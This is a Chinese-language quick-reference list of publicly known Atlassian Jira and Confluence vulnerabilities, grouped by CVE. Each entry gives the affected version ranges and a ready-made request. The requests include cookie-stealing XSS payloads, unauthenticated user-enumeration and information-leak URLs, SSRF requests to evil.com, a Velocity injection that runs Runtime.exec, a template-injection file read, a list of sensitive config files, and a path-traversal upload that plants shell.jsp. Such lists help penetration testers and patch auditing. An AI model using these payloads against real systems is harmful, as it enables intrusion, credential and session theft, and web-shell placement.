说明：实际的漏洞不止这些，有的是需要管理员权限的，有的是没有详情的Nday。这里整理的是已公开、且未授权或者普通账号权限可利用的漏洞。这次仔细参考NVD整理了各漏洞的影响范围，方便查询。如果有漏掉的有一定影响的漏洞详情欢迎指出。部分重要漏洞的细节可参考：[Atlassian产品漏洞整理](https://www.anquanke.com/post/id/197665)
## Jira

### XSS

#### [CVE-2018-20824]
version < 7.13.1 
- /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.cookie)

#### [CVE-2019-3400]
version < 7.13.2, 8.0.0 <= version < 8.0.2
- /plugins/servlet/gadgets/ifr?url=<scheme>://<jira.com:port>/rest/gadgets/1.0/g/com.atlassian.jira.gadgets:labels-gadget/gadgets/labels-gadget.xml&up_projectid=../../../../../rest/gadget/1.0/issueTable/jql%3fjql=issuekey%253e1%2520OR%2520issuekey%2521=%2522%253cimg%2520src=x%2520onerror=alert(document.cookie)%253e%2522%26&up_isConfigured=true

#### [CVE-2019-3402]
version < 7.13.3, 8.0.0 <= version < 8.1.1
- /secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu<script>alert(document.cookie)<%2Fscript>t1nmk&Search=Search

#### [CVE-2019-8444] [普通账号]评论处存储型XSS
version < 7.13.6, 8.0.0 <= version < 8.3.2
```
- !https://cdn.cnn.com/cnn/.e1mo/img/4.0/logos/logo_cnn_badge_2up.png|width=http://onmouseover=alert(77&#x29;;//!

- !image.png|width=\" onmouseover=alert(77);//!
```

### 信息泄露
#### [CVE-2019-3403] [未授权]用户名枚举
version < 7.13.3, 8.0.0 <= version < 8.0.4, 8.1.0 <= version < 8.1.1
- /rest/api/2/user/picker?query=admin
- /rest/api/latest/user/picker?query=admin

#### [CVE-2019-8449] [未授权]用户名枚举
version < 8.4.0
- /rest/api/2/groupuserpicker?query=admin
- /rest/api/latest/groupuserpicker?query=admin

#### [CVE-2019-8442] [未授权] 信息泄露
version < 7.13.4,  8.0.0 <= version < 8.0.4, 8.1.0 <= version < 8.1.1

反正不能访问WEB-INF目录。

- /s/test_by_cqq/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
- /s/test_by_cqq/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties

#### [CVE-2020-14179] [未授权] 信息泄露
version < 8.5.8, 8.6.0 <= version < 8.11.1
- /secure/QueryComponent!Default.jspa


#### CVE-2020-14181 [未授权]用户名枚举
version < 7.13.6, 8.0.0 <= version < 8.5.7, 8.6.0 <= version < 8.12.0.
- /secure/ViewUserHover.jspa?username=admin

### SSRF
#### [CVE-2017-9506] [中][未授权]
version < 7.3.5
- /plugins/servlet/oauth/users/icon-uri?consumerUri=http://baidu.com

#### [CVE-2019-8451] [中][未授权]
version < 8.4.0
- /plugins/servlet/gadgets/makeRequest?url=<scheme>://<jira.com:port>@<evil.com:port> -H "X-Atlassian-Token: no-check"


### RCE
#### [CVE-2019-11581] [高][未授权] [非默认配置，需开启联系管理员功能]
4.4.0 <= version < 7.6.14, 
7.7.0 <= version < 7.13.5,
8.0.0 <= version < 8.0.3,
8.1.0 <= verison < 8.1.2,
8.2.0 <= verison < 8.2.3

- /secure/ContactAdministrators.jspa "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('calc').waitFor()"


## Confluence

### 信息泄露
#### [CVE-2015-8399] [中][普通账号]敏感信息泄露
version < 5.8.17
- /spaces/viewdefaultdecorator.action?decoratorName=<FILE>
- /admin/viewdefaultdecorator.action?decoratorName=<FILE>

<FILE>:
```
- /WEB-INF/decorators.xml
- /WEB-INF/glue-config.xml
- /WEB-INF/server-config.wsdd
- /WEB-INF/sitemesh.xml
- /WEB-INF/urlrewrite.xml
- /WEB-INF/web.xml
- /databaseSubsystemContext.xml
- /securityContext.xml
- /services/statusServiceContext.xml
- com/atlassian/confluence/security/SpacePermission.hbm.xml
- com/atlassian/confluence/user/OSUUser.hbm.xml
- com/atlassian/confluence/security/ContentPermissionSet.hbm.xml
- com/atlassian/confluence/user/ConfluenceUser.hbm.xml
```


#### [CVE-2017-7415] [中][未授权]读任意blog或页面
6.0.0 <= version < 6.0.7
- /rest/tinymce/1/content/<pageId>/draft/diff


#### [CVE-2019-3394] [高][普通账号]敏感信息泄露
6.1.0 <= version < 6.6.16,
6.7.0 <= version < 6.13.7,
6.14.0 <= version < 6.15.8

- POST /rest/api/content/<pageId>
- GET /exportword?pageId=<pageId>

### SSRF
#### [CVE-2017-9506] [中][未授权]
verison < 6.1.3
- /plugins/servlet/oauth/users/icon-uri?consumerUri=http://baidu.com

#### [CVE-2019-3395] [中][未授权]
verison < 6.6.7, 6.7.0 <= version < 6.8.5, 6.9.0 <= version < 6.9.3
- /webdav -H "Host: evil.com" -H "key: value"

### RCE
#### [CVE-2019-3396] [高][未授权]模板注入
version < 6.6.12, 
6.7.0 <= version < 6.12.3, 
6.13.0 <= version < 6.13.3,
6.14.0 <= version < 6.14.2,

某些版本可RCE（需支持外联请求）可支持file协议读任意文件。某些版本只能读`/web.xml`这个文件所在目录的文件。

- /rest/tinymce/1/macro/preview {"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}


### 其他
#### [CVE-2019-3398] [高][普通账号]路径穿越（任意文件上传）
version < 6.6.13,
6.7.0 <= version < 6.12.4, 
6.13.0 <= version < 6.13.4,
6.14.0 <= version < 6.14.3,
6.15.0 <= version < 6.15.2

实际想利用成功需要知道Confluence安装目录的绝对路径，或者安装目录与启动目录的相对路径。
- POST /plugins/drag-and-drop/upload.action?pageId=<pageId>&filename=../../../../../../opt/atlassian/confluence/confluence/shell.jsp
- GET /pages/downloadallattachments.action?pageId=<pageId>



## 参考
- https://www.anquanke.com/post/id/197665
- https://github.com/shadowsock5/Poc/blob/master/Confluence/CVE-2019-3394.py
- https://github.com/superevr/cve-2019-3398/blob/master/poc.py
- https://twitter.com/harshbothra_/status/1346109605756116995
- https://gist.github.com/0x240x23elu/891371d46a1e270c7bdded0469d8e09c
- https://www.exploit-db.com/exploits/39170
- https://www.cvedetails.com/vendor/3578/Atlassian.html
